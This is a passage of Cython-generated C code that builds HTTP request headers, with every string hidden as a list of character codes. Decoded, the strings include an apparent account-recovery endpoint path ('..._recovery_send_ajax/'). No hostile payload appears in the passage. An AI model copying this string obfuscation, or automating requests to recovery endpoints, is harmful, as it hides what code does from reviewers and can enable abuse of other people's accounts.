  PyList_SET_ITEM(__pyx_t_3, 26, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 27, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 28, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 29, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 30, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 31, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 32, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_3, 33, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 34, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 35, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_3, 36, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 37, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 38, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 39, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 40, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 41, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 42, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 43, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_106);
  __Pyx_GIVEREF(__pyx_int_106);
  PyList_SET_ITEM(__pyx_t_3, 44, __pyx_int_106);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 45, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 46, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 47, __pyx_int_47);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_101);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_115);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_42);
  __Pyx_GIVEREF(__pyx_int_42);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_42);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_42);
  __Pyx_GIVEREF(__pyx_int_42);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_42);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(15); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_103);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(17); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_122);
  __Pyx_GIVEREF(__pyx_int_122);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_122);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_44);
  __Pyx_GIVEREF(__pyx_int_44);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_44);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_44);
  __Pyx_GIVEREF(__pyx_int_44);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_44);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_114);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(15); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_101);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(20); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_85);
  __Pyx_GIVEREF(__pyx_int_85);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_85);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_83);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_113);
  __Pyx_GIVEREF(__pyx_int_113);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_113);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_56);
  __Pyx_INCREF(__pyx_int_44);
  __Pyx_GIVEREF(__pyx_int_44);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_44);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_113);
  __Pyx_GIVEREF(__pyx_int_113);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_113);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_55);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_101);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(33); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
